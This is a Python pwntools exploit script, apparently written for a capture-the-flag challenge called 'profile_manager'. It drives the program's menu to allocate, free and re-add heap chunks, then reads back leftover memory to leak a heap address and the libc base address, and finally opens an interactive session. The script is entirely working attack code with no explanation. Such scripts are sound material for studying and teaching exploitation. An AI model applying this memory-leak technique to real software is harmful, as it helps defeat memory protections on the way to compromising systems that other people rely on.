#!/usr/bin/env python

from pwn import *
import time

# r = remote("csie.ctf.tw", 10140)
r = process('./profile_manager', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")})

def add_profile(name, age, length, data):
    r.sendafter(':', '1')
    r.sendafter(':', name)
    r.sendafter(':', str(age))
    r.sendafter(':', str(length))
    r.sendafter(':', data)

def show_profile(idx):
    r.sendafter(':', '2')
    r.sendafter(':', str(idx))

def edit_profile(idx, name, age, data):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx))
    r.sendafter(':', name)
    r.sendafter(':', str(age))
    r.sendafter(':', data)

def delete_profile(idx):
    r.sendafter(':', '4')
    r.sendafter(':', str(idx))

raw_input('#')

add_profile('a', 0, 0x100, 'a')
add_profile('a', 0, 0x100, 'a')
add_profile('a', 0, 0x100, 'a')
delete_profile(0)
delete_profile(1)
delete_profile(2)

add_profile('a', 0, 0x100 + 0x20, 'a')
add_profile('\x00', 0, 0x100, 'a')
add_profile('a', 0, 0x100, 'a')

edit_profile(1, 'a', 0, 'a')
show_profile(1)
r.recvuntil(' : ')
heap = u64(r.recvline()[:-1].ljust(8, '\x00')) - ord('a')
log.info(hex(heap))

edit_profile(1, 'a' * 8, 0, 'a')
show_profile(1)
r.recvuntil(' : ')
libc = u64(r.recvline()[8:-1].ljust(8, '\x00')) - 0x3c1b58
log.info(hex(libc))

r.interactive()
